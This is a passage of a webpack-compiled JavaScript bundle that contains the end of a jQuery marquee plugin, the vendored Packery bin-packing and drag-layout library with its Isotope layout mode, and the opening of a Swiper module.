                0 !== l.length ? l.filter(":last").html(h) : f("head").append("<style>" + h + "</style>");
                E(c[0], "AnimationIteration", function () {
                  b.trigger("finished");
                });
                E(c[0], "AnimationEnd", function () {
                  w();
                  b.trigger("finished");
                });
              } else c.animate(t, a.duration, a.easing, function () {
                b.trigger("finished");
                a.pauseOnCycle ? b.timer = setTimeout(w, a.delayBeforeStart) : w();
              });
              b.data("runningStatus", "resumed");
            };
            b.bind("pause", l.pause);
            b.bind("resume", l.resume);
            a.pauseOnHover && (b.bind("mouseenter", l.pause), b.bind("mouseleave", l.resume));
            p && a.allowCss3Support ? w() : b.timer = setTimeout(w, a.delayBeforeStart);
          }
        });
      };
      f.fn.marquee.defaults = {
        allowCss3Support: !0,
        css3easing: "linear",
        easing: "linear",
        delayBeforeStart: 1E3,
        direction: "left",
        duplicated: !1,
        duration: 5E3,
        gap: 20,
        pauseOnCycle: !1,
        pauseOnHover: !1,
        startVisible: !1
      };
    })(jQuery);

    /***/
  }),
  /***/"./src/js/_vendor/_packery-mode.pkgd.js": (
  /*!**********************************************!*\
    !*** ./src/js/_vendor/_packery-mode.pkgd.js ***!
    \**********************************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* WEBPACK VAR INJECTION */
    (function (module) {
      /* harmony import */var _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @babel/runtime/helpers/typeof */"./node_modules/@babel/runtime/helpers/typeof.js");
      /* harmony import */
      var _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0__);

      /*!
       * Packery layout mode PACKAGED v2.0.1
       * sub-classes Packery
       */

      /**
       * Rect
       * low-level utility class for basic geometry
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /* globals define, module */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('packery/js/rect', factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory();
        } else {
          // browser global
          window.Packery = window.Packery || {};
          window.Packery.Rect = factory();
        }
      })(window, function factory() {
        // -------------------------- Rect -------------------------- //

        function Rect(props) {
          // extend properties from defaults
          for (var prop in Rect.defaults) {
            this[prop] = Rect.defaults[prop];
          }
          for (prop in props) {
            this[prop] = props[prop];
          }
        }
        Rect.defaults = {
          x: 0,
          y: 0,
          width: 0,
          height: 0
        };
        var proto = Rect.prototype;

        /**
         * Determines whether or not this rectangle wholly encloses another rectangle or point.
         * @param {Rect} rect
         * @returns {Boolean}
        **/
        proto.contains = function (rect) {
          // points don't have width or height
          var otherWidth = rect.width || 0;
          var otherHeight = rect.height || 0;
          return this.x <= rect.x && this.y <= rect.y && this.x + this.width >= rect.x + otherWidth && this.y + this.height >= rect.y + otherHeight;
        };

        /**
         * Determines whether or not the rectangle intersects with another.
         * @param {Rect} rect
         * @returns {Boolean}
        **/
        proto.overlaps = function (rect) {
          var thisRight = this.x + this.width;
          var thisBottom = this.y + this.height;
          var rectRight = rect.x + rect.width;
          var rectBottom = rect.y + rect.height;

          // http://stackoverflow.com/a/306332
          return this.x < rectRight && thisRight > rect.x && this.y < rectBottom && thisBottom > rect.y;
        };

        /**
         * @param {Rect} rect - the overlapping rect
         * @returns {Array} freeRects - rects representing the area around the rect
        **/
        proto.getMaximalFreeRects = function (rect) {
          // if no intersection, return false
          if (!this.overlaps(rect)) {
            return false;
          }
          var freeRects = [];
          var freeRect;
          var thisRight = this.x + this.width;
          var thisBottom = this.y + this.height;
          var rectRight = rect.x + rect.width;
          var rectBottom = rect.y + rect.height;

          // top
          if (this.y < rect.y) {
            freeRect = new Rect({
              x: this.x,
              y: this.y,
              width: this.width,
              height: rect.y - this.y
            });
            freeRects.push(freeRect);
          }

          // right
          if (thisRight > rectRight) {
            freeRect = new Rect({
              x: rectRight,
              y: this.y,
              width: thisRight - rectRight,
              height: this.height
            });
            freeRects.push(freeRect);
          }

          // bottom
          if (thisBottom > rectBottom) {
            freeRect = new Rect({
              x: this.x,
              y: rectBottom,
              width: this.width,
              height: thisBottom - rectBottom
            });
            freeRects.push(freeRect);
          }

          // left
          if (this.x < rect.x) {
            freeRect = new Rect({
              x: this.x,
              y: this.y,
              width: rect.x - this.x,
              height: this.height
            });
            freeRects.push(freeRect);
          }
          return freeRects;
        };
        proto.canFit = function (rect) {
          return this.width >= rect.width && this.height >= rect.height;
        };
        return Rect;
      });

      /**
       * Packer
       * bin-packing algorithm
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /* globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('packery/js/packer', ['./rect'], factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(
            // require('./rect')
          );
        } else {
          // browser global
          var Packery = window.Packery = window.Packery || {};
          Packery.Packer = factory(Packery.Rect);
        }
      })(window, function factory(Rect) {
        // -------------------------- Packer -------------------------- //

        /**
         * @param {Number} width
         * @param {Number} height
         * @param {String} sortDirection
         *   topLeft for vertical, leftTop for horizontal
         */
        function Packer(width, height, sortDirection) {
          this.width = width || 0;
          this.height = height || 0;
          this.sortDirection = sortDirection || 'downwardLeftToRight';
          this.reset();
        }
        var proto = Packer.prototype;
        proto.reset = function () {
          this.spaces = [];
          var initialSpace = new Rect({
            x: 0,
            y: 0,
            width: this.width,
            height: this.height
          });
          this.spaces.push(initialSpace);
          // set sorter
          this.sorter = sorters[this.sortDirection] || sorters.downwardLeftToRight;
        };

        // change x and y of rect to fit with in Packer's available spaces
        proto.pack = function (rect) {
          for (var i = 0; i < this.spaces.length; i++) {
            var space = this.spaces[i];
            if (space.canFit(rect)) {
              this.placeInSpace(rect, space);
              break;
            }
          }
        };
        proto.columnPack = function (rect) {
          for (var i = 0; i < this.spaces.length; i++) {
            var space = this.spaces[i];
            var canFitInSpaceColumn = space.x <= rect.x && space.x + space.width >= rect.x + rect.width && space.height >= rect.height - 0.01; // fudge number for rounding error
            if (canFitInSpaceColumn) {
              rect.y = space.y;
              this.placed(rect);
              break;
            }
          }
        };
        proto.rowPack = function (rect) {
          for (var i = 0; i < this.spaces.length; i++) {
            var space = this.spaces[i];
            var canFitInSpaceRow = space.y <= rect.y && space.y + space.height >= rect.y + rect.height && space.width >= rect.width - 0.01; // fudge number for rounding error
            if (canFitInSpaceRow) {
              rect.x = space.x;
              this.placed(rect);
              break;
            }
          }
        };
        proto.placeInSpace = function (rect, space) {
          // place rect in space
          rect.x = space.x;
          rect.y = space.y;
          this.placed(rect);
        };

        // update spaces with placed rect
        proto.placed = function (rect) {
          // update spaces
          var revisedSpaces = [];
          for (var i = 0; i < this.spaces.length; i++) {
            var space = this.spaces[i];
            var newSpaces = space.getMaximalFreeRects(rect);
            // add either the original space or the new spaces to the revised spaces
            if (newSpaces) {
              revisedSpaces.push.apply(revisedSpaces, newSpaces);
            } else {
              revisedSpaces.push(space);
            }
          }
          this.spaces = revisedSpaces;
          this.mergeSortSpaces();
        };
        proto.mergeSortSpaces = function () {
          // remove redundant spaces
          Packer.mergeRects(this.spaces);
          this.spaces.sort(this.sorter);
        };

        // add a space back
        proto.addSpace = function (rect) {
          this.spaces.push(rect);
          this.mergeSortSpaces();
        };

        // -------------------------- utility functions -------------------------- //

        /**
         * Remove redundant rectangle from array of rectangles
         * @param {Array} rects: an array of Rects
         * @returns {Array} rects: an array of Rects
        **/
        Packer.mergeRects = function (rects) {
          var i = 0;
          var rect = rects[i];
          rectLoop: while (rect) {
            var j = 0;
            var compareRect = rects[i + j];
            while (compareRect) {
              if (compareRect == rect) {
                j++; // next
              } else if (compareRect.contains(rect)) {
                // remove rect
                rects.splice(i, 1);
                rect = rects[i]; // set next rect
                continue rectLoop; // bail on compareLoop
              } else if (rect.contains(compareRect)) {
                // remove compareRect
                rects.splice(i + j, 1);
              } else {
                j++;
              }
              compareRect = rects[i + j]; // set next compareRect
            }
            i++;
            rect = rects[i];
          }
          return rects;
        };

        // -------------------------- sorters -------------------------- //

        // functions for sorting rects in order
        var sorters = {
          // top down, then left to right
          downwardLeftToRight: function downwardLeftToRight(a, b) {
            return a.y - b.y || a.x - b.x;
          },
          // left to right, then top down
          rightwardTopToBottom: function rightwardTopToBottom(a, b) {
            return a.x - b.x || a.y - b.y;
          }
        };

        // --------------------------  -------------------------- //

        return Packer;
      });

      /**
       * Packery Item Element
      **/

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /* globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('packery/js/item', ['outlayer/outlayer'
          // './rect'
          ], factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(__webpack_require__(/*! outlayer */"./node_modules/outlayer/outlayer.js")
          // require('./rect')
          );
        } else {
          // browser global
          window.Packery.Item = factory(window.Outlayer, window.Packery.Rect);
        }
      })(window, function factory(Outlayer, Rect) {
        // -------------------------- Item -------------------------- //

        var docElemStyle = document.documentElement.style;
        var transformProperty = typeof docElemStyle.transform == 'string' ? 'transform' : 'WebkitTransform';

        // sub-class Item
        var Item = function PackeryItem() {
          Outlayer.Item.apply(this, arguments);
        };
        var proto = Item.prototype = Object.create(Outlayer.Item.prototype);
        var __create = proto._create;
        proto._create = function () {
          // call default _create logic
          __create.call(this);
          this.rect = new Rect();
        };
        var _moveTo = proto.moveTo;
        proto.moveTo = function (x, y) {
          // don't shift 1px while dragging
          var dx = Math.abs(this.position.x - x);
          var dy = Math.abs(this.position.y - y);
          var canHackGoTo = this.layout.dragItemCount && !this.isPlacing && !this.isTransitioning && dx < 1 && dy < 1;
          if (canHackGoTo) {
            this.goTo(x, y);
            return;
          }
          _moveTo.apply(this, arguments);
        };

        // -------------------------- placing -------------------------- //

        proto.enablePlacing = function () {
          this.removeTransitionStyles();
          // remove transform property from transition
          if (this.isTransitioning && transformProperty) {
            this.element.style[transformProperty] = 'none';
          }
          this.isTransitioning = false;
          this.getSize();
          this.layout._setRectSize(this.element, this.rect);
          this.isPlacing = true;
        };
        proto.disablePlacing = function () {
          this.isPlacing = false;
        };

        // -----  ----- //

        // remove element from DOM
        proto.removeElem = function () {
          this.element.parentNode.removeChild(this.element);
          // add space back to packer
          this.layout.packer.addSpace(this.rect);
          this.emitEvent('remove', [this]);
        };

        // ----- dropPlaceholder ----- //

        proto.showDropPlaceholder = function () {
          var dropPlaceholder = this.dropPlaceholder;
          if (!dropPlaceholder) {
            // create dropPlaceholder
            dropPlaceholder = this.dropPlaceholder = document.createElement('div');
            dropPlaceholder.className = 'packery-drop-placeholder';
            dropPlaceholder.style.position = 'absolute';
          }
          dropPlaceholder.style.width = this.size.width + 'px';
          dropPlaceholder.style.height = this.size.height + 'px';
          this.positionDropPlaceholder();
          this.layout.element.appendChild(dropPlaceholder);
        };
        proto.positionDropPlaceholder = function () {
          this.dropPlaceholder.style[transformProperty] = 'translate(' + this.rect.x + 'px, ' + this.rect.y + 'px)';
        };
        proto.hideDropPlaceholder = function () {
          this.layout.element.removeChild(this.dropPlaceholder);
        };

        // -----  ----- //

        return Item;
      });

      /*!
       * Packery v2.0.0
       * Gapless, draggable grid layouts
       *
       * Licensed GPLv3 for open source use
       * or Packery Commercial License for commercial use
       *
       * http://packery.metafizzy.co
       * Copyright 2016 Metafizzy
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /* globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('packery/js/packery', ['get-size/get-size', 'outlayer/outlayer'
          // './rect',
          // './packer',
          // './item'
          ], factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(__webpack_require__(/*! get-size */"./node_modules/get-size/get-size.js"), __webpack_require__(/*! outlayer */"./node_modules/outlayer/outlayer.js")
          // require('./rect'),
          // require('./packer'),
          // require('./item')
          );
        } else {
          // browser global
          window.Packery = factory(window.getSize, window.Outlayer, window.Packery.Rect, window.Packery.Packer, window.Packery.Item);
        }
      })(window, function factory(getSize, Outlayer, Rect, Packer, Item) {
        // ----- Rect ----- //

        // allow for pixel rounding errors IE8-IE11 & Firefox; #227
        Rect.prototype.canFit = function (rect) {
          return this.width >= rect.width - 1 && this.height >= rect.height - 1;
        };

        // -------------------------- Packery -------------------------- //

        // create an Outlayer layout class
        var Packery = Outlayer.create('packery');
        Packery.Item = Item;
        var proto = Packery.prototype;
        proto._create = function () {
          // call super
          Outlayer.prototype._create.call(this);

          // initial properties
          this.packer = new Packer();
          // packer for drop targets
          this.shiftPacker = new Packer();
          this.isEnabled = true;
          this.dragItemCount = 0;

          // create drag handlers
          var _this = this;
          this.handleDraggabilly = {
            dragStart: function dragStart() {
              _this.itemDragStart(this.element);
            },
            dragMove: function dragMove() {
              _this.itemDragMove(this.element, this.position.x, this.position.y);
            },
            dragEnd: function dragEnd() {
              _this.itemDragEnd(this.element);
            }
          };
          this.handleUIDraggable = {
            start: function handleUIDraggableStart(event, ui) {
              // HTML5 may trigger dragstart, dismiss HTML5 dragging
              if (!ui) {
                return;
              }
              _this.itemDragStart(event.currentTarget);
            },
            drag: function handleUIDraggableDrag(event, ui) {
              if (!ui) {
                return;
              }
              _this.itemDragMove(event.currentTarget, ui.position.left, ui.position.top);
            },
            stop: function handleUIDraggableStop(event, ui) {
              if (!ui) {
                return;
              }
              _this.itemDragEnd(event.currentTarget);
            }
          };
        };

        // ----- init & layout ----- //

        /**
         * logic before any new layout
         */
        proto._resetLayout = function () {
          this.getSize();
          this._getMeasurements();

          // reset packer
          var width, height, sortDirection;
          // packer settings, if horizontal or vertical
          if (this._getOption('horizontal')) {
            width = Infinity;
            height = this.size.innerHeight + this.gutter;
            sortDirection = 'rightwardTopToBottom';
          } else {
            width = this.size.innerWidth + this.gutter;
            height = Infinity;
            sortDirection = 'downwardLeftToRight';
          }
          this.packer.width = this.shiftPacker.width = width;
          this.packer.height = this.shiftPacker.height = height;
          this.packer.sortDirection = this.shiftPacker.sortDirection = sortDirection;
          this.packer.reset();

          // layout
          this.maxY = 0;
          this.maxX = 0;
        };

        /**
         * update columnWidth, rowHeight, & gutter
         * @private
         */
        proto._getMeasurements = function () {
          this._getMeasurement('columnWidth', 'width');
          this._getMeasurement('rowHeight', 'height');
          this._getMeasurement('gutter', 'width');
        };
        proto._getItemLayoutPosition = function (item) {
          this._setRectSize(item.element, item.rect);
          if (this.isShifting || this.dragItemCount > 0) {
            var packMethod = this._getPackMethod();
            this.packer[packMethod](item.rect);
          } else {
            this.packer.pack(item.rect);
          }
          this._setMaxXY(item.rect);
          return item.rect;
        };
        proto.shiftLayout = function () {
          this.isShifting = true;
          this.layout();
          delete this.isShifting;
        };
        proto._getPackMethod = function () {
          return this._getOption('horizontal') ? 'rowPack' : 'columnPack';
        };

        /**
         * set max X and Y value, for size of container
         * @param {Packery.Rect} rect
         * @private
         */
        proto._setMaxXY = function (rect) {
          this.maxX = Math.max(rect.x + rect.width, this.maxX);
          this.maxY = Math.max(rect.y + rect.height, this.maxY);
        };

        /**
         * set the width and height of a rect, applying columnWidth and rowHeight
         * @param {Element} elem
         * @param {Packery.Rect} rect
         */
        proto._setRectSize = function (elem, rect) {
          var size = getSize(elem);
          var w = size.outerWidth;
          var h = size.outerHeight;
          // size for columnWidth and rowHeight, if available
          // only check if size is non-zero, #177
          if (w || h) {
            w = this._applyGridGutter(w, this.columnWidth);
            h = this._applyGridGutter(h, this.rowHeight);
          }
          // rect must fit in packer
          rect.width = Math.min(w, this.packer.width);
          rect.height = Math.min(h, this.packer.height);
        };

        /**
         * fits item to columnWidth/rowHeight and adds gutter
         * @param {Number} measurement - item width or height
         * @param {Number} gridSize - columnWidth or rowHeight
         * @returns measurement
         */
        proto._applyGridGutter = function (measurement, gridSize) {
          // just add gutter if no gridSize
          if (!gridSize) {
            return measurement + this.gutter;
          }
          gridSize += this.gutter;
          // fit item to columnWidth/rowHeight
          var remainder = measurement % gridSize;
          var mathMethod = remainder && remainder < 1 ? 'round' : 'ceil';
          measurement = Math[mathMethod](measurement / gridSize) * gridSize;
          return measurement;
        };
        proto._getContainerSize = function () {
          if (this._getOption('horizontal')) {
            return {
              width: this.maxX - this.gutter
            };
          } else {
            return {
              height: this.maxY - this.gutter
            };
          }
        };

        // -------------------------- stamp -------------------------- //

        /**
         * makes space for element
         * @param {Element} elem
         */
        proto._manageStamp = function (elem) {
          var item = this.getItem(elem);
          var rect;
          if (item && item.isPlacing) {
            rect = item.rect;
          } else {
            var offset = this._getElementOffset(elem);
            rect = new Rect({
              x: this._getOption('originLeft') ? offset.left : offset.right,
              y: this._getOption('originTop') ? offset.top : offset.bottom
            });
          }
          this._setRectSize(elem, rect);
          // save its space in the packer
          this.packer.placed(rect);
          this._setMaxXY(rect);
        };

        // -------------------------- methods -------------------------- //

        function verticalSorter(a, b) {
          return a.position.y - b.position.y || a.position.x - b.position.x;
        }
        function horizontalSorter(a, b) {
          return a.position.x - b.position.x || a.position.y - b.position.y;
        }
        proto.sortItemsByPosition = function () {
          var sorter = this._getOption('horizontal') ? horizontalSorter : verticalSorter;
          this.items.sort(sorter);
        };

        /**
         * Fit item element in its current position
         * Packery will position elements around it
         * useful for expanding elements
         *
         * @param {Element} elem
         * @param {Number} x - horizontal destination position, optional
         * @param {Number} y - vertical destination position, optional
         */
        proto.fit = function (elem, x, y) {
          var item = this.getItem(elem);
          if (!item) {
            return;
          }

          // stamp item to get it out of layout
          this.stamp(item.element);
          // set placing flag
          item.enablePlacing();
          this.updateShiftTargets(item);
          // fall back to current position for fitting
          x = x === undefined ? item.rect.x : x;
          y = y === undefined ? item.rect.y : y;
          // position it best at its destination
          this.shift(item, x, y);
          this._bindFitEvents(item);
          item.moveTo(item.rect.x, item.rect.y);
          // layout everything else
          this.shiftLayout();
          // return back to regularly scheduled programming
          this.unstamp(item.element);
          this.sortItemsByPosition();
          item.disablePlacing();
        };

        /**
         * emit event when item is fit and other items are laid out
         * @param {Packery.Item} item
         * @private
         */
        proto._bindFitEvents = function (item) {
          var _this = this;
          var ticks = 0;
          function onLayout() {
            ticks++;
            if (ticks != 2) {
              return;
            }
            _this.dispatchEvent('fitComplete', null, [item]);
          }
          // when item is laid out
          item.once('layout', onLayout);
          // when all items are laid out
          this.once('layoutComplete', onLayout);
        };

        // -------------------------- resize -------------------------- //

        // debounced, layout on resize
        proto.resize = function () {
          // don't trigger if size did not change
          // or if resize was unbound. See #285, outlayer#9
          if (!this.isResizeBound || !this.needsResizeLayout()) {
            return;
          }
          if (this.options.shiftPercentResize) {
            this.resizeShiftPercentLayout();
          } else {
            this.layout();
          }
        };

        /**
         * check if layout is needed post layout
         * @returns Boolean
         */
        proto.needsResizeLayout = function () {
          var size = getSize(this.element);
          var innerSize = this._getOption('horizontal') ? 'innerHeight' : 'innerWidth';
          return size[innerSize] != this.size[innerSize];
        };
        proto.resizeShiftPercentLayout = function () {
          var items = this._getItemsForLayout(this.items);
          var isHorizontal = this._getOption('horizontal');
          var coord = isHorizontal ? 'y' : 'x';
          var measure = isHorizontal ? 'height' : 'width';
          var segmentName = isHorizontal ? 'rowHeight' : 'columnWidth';
          var innerSize = isHorizontal ? 'innerHeight' : 'innerWidth';

          // proportional re-align items
          var previousSegment = this[segmentName];
          previousSegment = previousSegment && previousSegment + this.gutter;
          if (previousSegment) {
            this._getMeasurements();
            var currentSegment = this[segmentName] + this.gutter;
            items.forEach(function (item) {
              var seg = Math.round(item.rect[coord] / previousSegment);
              item.rect[coord] = seg * currentSegment;
            });
          } else {
            var currentSize = getSize(this.element)[innerSize] + this.gutter;
            var previousSize = this.packer[measure];
            items.forEach(function (item) {
              item.rect[coord] = item.rect[coord] / previousSize * currentSize;
            });
          }
          this.shiftLayout();
        };

        // -------------------------- drag -------------------------- //

        /**
         * handle an item drag start event
         * @param {Element} elem
         */
        proto.itemDragStart = function (elem) {
          if (!this.isEnabled) {
            return;
          }
          this.stamp(elem);
          // this.ignore( elem );
          var item = this.getItem(elem);
          if (!item) {
            return;
          }
          item.enablePlacing();
          item.showDropPlaceholder();
          this.dragItemCount++;
          this.updateShiftTargets(item);
        };
        proto.updateShiftTargets = function (dropItem) {
          this.shiftPacker.reset();

          // pack stamps
          this._getBoundingRect();
          var isOriginLeft = this._getOption('originLeft');
          var isOriginTop = this._getOption('originTop');
          this.stamps.forEach(function (stamp) {
            // ignore dragged item
            var item = this.getItem(stamp);
            if (item && item.isPlacing) {
              return;
            }
            var offset = this._getElementOffset(stamp);
            var rect = new Rect({
              x: isOriginLeft ? offset.left : offset.right,
              y: isOriginTop ? offset.top : offset.bottom
            });
            this._setRectSize(stamp, rect);
            // save its space in the packer
            this.shiftPacker.placed(rect);
          }, this);

          // reset shiftTargets
          var isHorizontal = this._getOption('horizontal');
          var segmentName = isHorizontal ? 'rowHeight' : 'columnWidth';
          var measure = isHorizontal ? 'height' : 'width';
          this.shiftTargetKeys = [];
          this.shiftTargets = [];
          var boundsSize;
          var segment = this[segmentName];
          segment = segment && segment + this.gutter;
          if (segment) {
            var segmentSpan = Math.ceil(dropItem.rect[measure] / segment);
            var segs = Math.floor((this.shiftPacker[measure] + this.gutter) / segment);
            boundsSize = (segs - segmentSpan) * segment;
            // add targets on top
            for (var i = 0; i < segs; i++) {
              this._addShiftTarget(i * segment, 0, boundsSize);
            }
          } else {
            boundsSize = this.shiftPacker[measure] + this.gutter - dropItem.rect[measure];
            this._addShiftTarget(0, 0, boundsSize);
          }

          // pack each item to measure where shiftTargets are
          var items = this._getItemsForLayout(this.items);
          var packMethod = this._getPackMethod();
          items.forEach(function (item) {
            var rect = item.rect;
            this._setRectSize(item.element, rect);
            this.shiftPacker[packMethod](rect);

            // add top left corner
            this._addShiftTarget(rect.x, rect.y, boundsSize);
            // add bottom left / top right corner
            var cornerX = isHorizontal ? rect.x + rect.width : rect.x;
            var cornerY = isHorizontal ? rect.y : rect.y + rect.height;
            this._addShiftTarget(cornerX, cornerY, boundsSize);
            if (segment) {
              // add targets for each column on bottom / row on right
              var segSpan = Math.round(rect[measure] / segment);
              for (var i = 1; i < segSpan; i++) {
                var segX = isHorizontal ? cornerX : rect.x + segment * i;
                var segY = isHorizontal ? rect.y + segment * i : cornerY;
                this._addShiftTarget(segX, segY, boundsSize);
              }
            }
          }, this);
        };
        proto._addShiftTarget = function (x, y, boundsSize) {
          var checkCoord = this._getOption('horizontal') ? y : x;
          if (checkCoord !== 0 && checkCoord > boundsSize) {
            return;
          }
          // create string for a key, easier to keep track of what targets
          var key = x + ',' + y;
          var hasKey = this.shiftTargetKeys.indexOf(key) != -1;
          if (hasKey) {
            return;
          }
          this.shiftTargetKeys.push(key);
          this.shiftTargets.push({
            x: x,
            y: y
          });
        };

        // -------------------------- drop -------------------------- //

        proto.shift = function (item, x, y) {
          var shiftPosition;
          var minDistance = Infinity;
          var position = {
            x: x,
            y: y
          };
          this.shiftTargets.forEach(function (target) {
            var distance = getDistance(target, position);
            if (distance < minDistance) {
              shiftPosition = target;
              minDistance = distance;
            }
          });
          item.rect.x = shiftPosition.x;
          item.rect.y = shiftPosition.y;
        };
        function getDistance(a, b) {
          var dx = b.x - a.x;
          var dy = b.y - a.y;
          return Math.sqrt(dx * dx + dy * dy);
        }

        // -------------------------- drag move -------------------------- //

        var DRAG_THROTTLE_TIME = 120;

        /**
         * handle an item drag move event
         * @param {Element} elem
         * @param {Number} x - horizontal change in position
         * @param {Number} y - vertical change in position
         */
        proto.itemDragMove = function (elem, x, y) {
          var item = this.isEnabled && this.getItem(elem);
          if (!item) {
            return;
          }
          x -= this.size.paddingLeft;
          y -= this.size.paddingTop;
          var _this = this;
          function onDrag() {
            _this.shift(item, x, y);
            item.positionDropPlaceholder();
            _this.layout();
          }

          // throttle
          var now = new Date();
          if (this._itemDragTime && now - this._itemDragTime < DRAG_THROTTLE_TIME) {
            clearTimeout(this.dragTimeout);
            this.dragTimeout = setTimeout(onDrag, DRAG_THROTTLE_TIME);
          } else {
            onDrag();
            this._itemDragTime = now;
          }
        };

        // -------------------------- drag end -------------------------- //

        /**
         * handle an item drag end event
         * @param {Element} elem
         */
        proto.itemDragEnd = function (elem) {
          var item = this.isEnabled && this.getItem(elem);
          if (!item) {
            return;
          }
          clearTimeout(this.dragTimeout);
          item.element.classList.add('is-positioning-post-drag');
          var completeCount = 0;
          var _this = this;
          function onDragEndLayoutComplete() {
            completeCount++;
            if (completeCount != 2) {
              return;
            }
            // reset drag item
            item.element.classList.remove('is-positioning-post-drag');
            item.hideDropPlaceholder();
            _this.dispatchEvent('dragItemPositioned', null, [item]);
          }
          item.once('layout', onDragEndLayoutComplete);
          this.once('layoutComplete', onDragEndLayoutComplete);
          item.moveTo(item.rect.x, item.rect.y);
          this.layout();
          this.dragItemCount = Math.max(0, this.dragItemCount - 1);
          this.sortItemsByPosition();
          item.disablePlacing();
          this.unstamp(item.element);
        };

        /**
         * binds Draggabilly events
         * @param {Draggabilly} draggie
         */
        proto.bindDraggabillyEvents = function (draggie) {
          this._bindDraggabillyEvents(draggie, 'on');
        };
        proto.unbindDraggabillyEvents = function (draggie) {
          this._bindDraggabillyEvents(draggie, 'off');
        };
        proto._bindDraggabillyEvents = function (draggie, method) {
          var handlers = this.handleDraggabilly;
          draggie[method]('dragStart', handlers.dragStart);
          draggie[method]('dragMove', handlers.dragMove);
          draggie[method]('dragEnd', handlers.dragEnd);
        };

        /**
         * binds jQuery UI Draggable events
         * @param {jQuery} $elems
         */
        proto.bindUIDraggableEvents = function ($elems) {
          this._bindUIDraggableEvents($elems, 'on');
        };
        proto.unbindUIDraggableEvents = function ($elems) {
          this._bindUIDraggableEvents($elems, 'off');
        };
        proto._bindUIDraggableEvents = function ($elems, method) {
          var handlers = this.handleUIDraggable;
          $elems[method]('dragstart', handlers.start)[method]('drag', handlers.drag)[method]('dragstop', handlers.stop);
        };

        // ----- destroy ----- //

        var _destroy = proto.destroy;
        proto.destroy = function () {
          _destroy.apply(this, arguments);
          // disable flag; prevent drag events from triggering. #72
          this.isEnabled = false;
        };

        // -----  ----- //

        Packery.Rect = Rect;
        Packery.Packer = Packer;
        return Packery;
      });

      /*!
       * Packery layout mode v2.0.1
       * sub-classes Packery
       */

      /*jshint browser: true, strict: true, undef: true, unused: true */

      (function (window, factory) {
        // universal module definition
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define(['isotope-layout/js/layout-mode', 'packery/js/packery'], factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(__webpack_require__(/*! isotope-layout/js/layout-mode */"./node_modules/isotope-layout/js/layout-mode.js"), __webpack_require__(/*! packery */"./node_modules/packery/js/packery.js"));
        } else {
          // browser global
          factory(window.Isotope.LayoutMode, window.Packery);
        }
      })(window, function factor(LayoutMode, Packery) {
        // create an Outlayer layout class
        var PackeryMode = LayoutMode.create('packery');
        var proto = PackeryMode.prototype;
        var keepModeMethods = {
          _getElementOffset: true,
          _getMeasurement: true
        };

        // inherit Packery prototype
        for (var method in Packery.prototype) {
          // do not inherit mode methods
          if (!keepModeMethods[method]) {
            proto[method] = Packery.prototype[method];
          }
        }

        // set packer in _resetLayout
        var _resetLayout = proto._resetLayout;
        proto._resetLayout = function () {
          this.packer = this.packer || new Packery.Packer();
          this.shiftPacker = this.shiftPacker || new Packery.Packer();
          _resetLayout.apply(this, arguments);
        };
        var _getItemLayoutPosition = proto._getItemLayoutPosition;
        proto._getItemLayoutPosition = function (item) {
          // set packery rect
          item.rect = item.rect || new Packery.Rect();
          return _getItemLayoutPosition.call(this, item);
        };

        // needsResizeLayout for vertical or horizontal
        var _needsResizeLayout = proto.needsResizeLayout;
        proto.needsResizeLayout = function () {
          if (this._getOption('horizontal')) {
            return this.needsVerticalResizeLayout();
          } else {
            return _needsResizeLayout.call(this);
          }
        };

        // point to mode options for horizontal
        var _getOption = proto._getOption;
        proto._getOption = function (option) {
          if (option == 'horizontal') {
            return this.options.isHorizontal !== undefined ? this.options.isHorizontal : this.options.horizontal;
          }
          return _getOption.apply(this.isotope, arguments);
        };
        return PackeryMode;
      });
      /* WEBPACK VAR INJECTION */
    }).call(this, __webpack_require__(/*! ./../../../node_modules/webpack/buildin/harmony-module.js */"./node_modules/webpack/buildin/harmony-module.js")(module));

    /***/
  }),
  /***/"./src/js/_vendor/_swiper.min.js": (
  /*!***************************************!*\
    !*** ./src/js/_vendor/_swiper.min.js ***!
    \***************************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* WEBPACK VAR INJECTION */
    (function (module) {
      /* harmony import */var _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @babel/runtime/helpers/typeof */"./node_modules/@babel/runtime/helpers/typeof.js");
      /* harmony import */
